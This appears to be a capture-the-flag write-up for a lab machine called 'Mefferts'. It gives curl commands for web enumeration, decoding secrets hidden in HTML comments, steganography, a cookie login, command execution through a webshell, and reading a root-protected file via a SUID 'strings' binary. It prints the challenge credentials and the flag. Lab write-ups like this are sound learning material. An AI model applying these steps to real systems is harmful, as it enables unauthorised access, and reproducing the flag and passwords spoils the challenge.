# Write-up : "Mefferts"

**Target:** 10.10.0.22 (the IP changes on every redeploy: also seen as .8 / .73)

**Objective:** Get user.txt

**Difficulty:** Medium

**Date:** 15/09/2026

**Techniques used:** Web reconnaissance, HTML comment enumeration, multi-layer decoding (Base64 / Base32 / hex), steganography (steghide), form and cookie authentication, RCE via hidden webshell

**Tools used:** nmap, curl, base64, base32, xxd, wget, steghide

---

## 1. Network reconnaissance (Nmap)

```bash
nmap -sV -p- 10.10.0.22
```
**Why:** identify exposed services before any exploitation.
**Result:** `22/tcp` SSH, `80/tcp` HTTP (Apache 2.4.68). It's web, we attack from there.

---

## 2. Exploring the main web page

```bash
curl -s http://10.10.0.22/
```
**Result:** two comments hidden in the source code:

```html
<!--Note to self - Recover your password at /recovery.php! -->
<!-- VGhlIGJhY2t1cCBwYXNzd2QgaXMgaGVyZSwgdXNlIGl0IGluIGxhc3QgcmVzb3J0... -->
```

**Vulnerability exploited:** exposure of sensitive information in the source code (CWE-200). A dev comment reveals a hidden path and an encoded secret.

---

## 3. Decoding the first secret (Base64)

```bash
echo 'VGhlIGJhY2t1cCBwYXNzd2QgaXMgaGVyZSwgdXNlIGl0IGluIGxhc3QgcmVzb3J0LCBpbiBjYXNlIHlvdSBuZWVkIGEga2V5IG9yIHNvbWV0aGluZzogNVVjaF80X0czbjF1NV9jUjM0VG9S' | base64 -d ; echo
```
**Result:**

```
The backup passwd is here, use it in last resort, in case you need a key or something: 5Uch_4_G3n1u5_cR34ToR
```

We keep this password: `5Uch_4_G3n1u5_cR34ToR`.

---

## 4. The recovery page (/recovery.php)

```bash
curl -s http://10.10.0.22/recovery.php
```
**Result:** a login form, an `<h1>Hello Uwe!</h1>` (the user is probably Uwe) and an encoded comment:

```html
<!-- R1U0VE1aUlhHVVpEQU5SV0daVERPTVJXRzQzR01OWlVH...  -->
```

Decoding (Base32 then hex):

```bash
echo 'R1U0VE1aUlhHVVpEQU5SV0daVERPTVJXRzQzR01OWlVH...' | base64 -d | base32 -d | xxd -r -p ; echo
```
**Result:**

```
You forgot again didnt you? remember: the cubes are the keys to everything
```

Hint: the cubes (images) hold the key.

---

## 5. Steganography on the cube images

Retrieving the images:

```bash
cd /tmp
wget http://10.10.0.22/assets/cube_barrel.jpg
```
(and the other cubes: cube_gold.jpg, etc.)

Extraction with the password found in step 3:

```bash
steghide extract -sf cube_gold.jpg -p 5Uch_4_G3n1u5_cR34ToR
```
- `-sf` = source file (the image), `-p` = passphrase.

**Vulnerability exploited:** sensitive data hidden by steganography with a reused secret (CWE-311).
**Result:** 4 cubes contained nothing (`could not extract any data`), but `cube_gold.jpg` was hiding a `passwd` file:

```bash
cat passwd
# Username: uweThePuzzleMaster
# Password: i_W4N7_70_C0Ll3C7_4Ll_Pu22l35
```

---

## 6. Authentication on the recovery form

```bash
curl -i http://10.10.0.22/recovery.php -d "user=uweThePuzzleMaster&pass=i_W4N7_70_C0Ll3C7_4Ll_Pu22l35"
```
- `-i` = displays the headers (including `Location` and `Set-Cookie`), `-d` = sends the form as POST.

**Result:**

```
HTTP/1.1 302 Found
Set-Cookie: login=uwe%3Athisisnotevennecessary; ...
location: /my_very_secret_dir/index.php
```

Redirect to a secret directory, with a `login` session cookie.

---

## 7. Accessing the secret directory (cookie required)

```bash
curl -s http://10.10.0.22/my_very_secret_dir/index.php -b "login=uwe:thisisnotevennecessary"
```
- `-b` = sends the cookie obtained in the previous step (without it, access is denied).

**Result:** `Secret Page, don't share! GET me a cmd and we'll talk!` with an empty `<pre>` tag. The page expects a `cmd` parameter.

---

## 8. Remote command execution (RCE)

```bash
curl -s "http://10.10.0.22/my_very_secret_dir/index.php?cmd=id" -b "login=uwe:thisisnotevennecessary"
```
**Result:** `uid=33(www-data)`. RCE confirmed (RCE = Remote Code Execution).

Reading the source:

```bash
curl -s "http://10.10.0.22/my_very_secret_dir/index.php?cmd=cat index.php" -b "login=uwe:thisisnotevennecessary"
# system($_GET['cmd']);
```

**Vulnerability exploited:** execution of system commands via an unfiltered parameter (CWE-78, OS Command Injection).

Reminder: in a URL, a space is written `%20`, `>` is written `%3E`.

---

## 9. System exploration

```bash
curl -s "http://10.10.0.22/my_very_secret_dir/index.php?cmd=ls /home" -b "login=uwe:thisisnotevennecessary"
# uwe   uwe_passwords
```

`uwe_passwords` turned out to be a red herring (just an Asterix reference).

---

## 10. Bypassing permissions via a SUID binary

`www-data` cannot read `/home/uwe/user.txt`. We look for a root SUID binary:

```bash
curl -s "http://10.10.0.22/my_very_secret_dir/index.php?cmd=find / -perm -4000 -type f 2>/dev/null" -b "login=uwe:thisisnotevennecessary"
```
**Result:** `/usr/bin/x86_64-linux-gnu-strings`. A `strings` with SUID root, which is not normal.

**Vulnerability exploited:** root SUID binary allowing arbitrary file reads (CWE-732).

Reading the flag via this binary:

```bash
curl -s "http://10.10.0.22/my_very_secret_dir/index.php?cmd=/usr/bin/x86_64-linux-gnu-strings /home/uwe/user.txt" -b "login=uwe:thisisnotevennecessary"
```

**FLAG obtained:**

```
EPI{Wha7_1f_1_70ld_Y0u_p37AM1nX}
```

---

## Summary of exploited vulnerabilities

| # | Vulnerability | Category (CWE) |
| --- | --- | --- |
| 1 | Secrets in HTML comments (path and password) | CWE-200 |
| 2 | Weak obfuscation (Base64/Base32/hex) | CWE-311 |
| 3 | Credentials hidden by steganography (steghide) | CWE-311 |
| 4 | Trivial authentication cookie | CWE-565 |
| 5 | Exposed webshell (`system($_GET['cmd'])`) | CWE-78 (RCE) |
| 6 | Root SUID binary `strings` | CWE-732 |

---

## Summary of steps

1. HTML comment: path `/recovery.php` and a Base64 secret.
2. Base64 decoded: steghide password `5Uch_4_G3n1u5_cR34ToR`.
3. Hint "the cubes are the keys", steghide on `cube_gold.jpg`.
4. Creds obtained: `uweThePuzzleMaster` / `i_W4N7_70_C0Ll3C7_4Ll_Pu22l35`.
5. POST on `/recovery.php`, login cookie, access to `/my_very_secret_dir/index.php`.
6. `?cmd=` parameter, RCE as www-data.
7. SUID `strings` to read `/home/uwe/user.txt`, the flag.

---

## Conclusion

- **Initial access:** web enumeration (HTML comments), multi-layer decoding, steganography on `cube_gold.jpg`.
- **Application access:** authentication on `/recovery.php`, cookie, hidden webshell, RCE as `www-data`.
- **Reading the flag:** abuse of the SUID binary `strings` to read a forbidden file.
- **User flag:** `EPI{Wha7_1f_1_70ld_Y0u_p37AM1nX}`
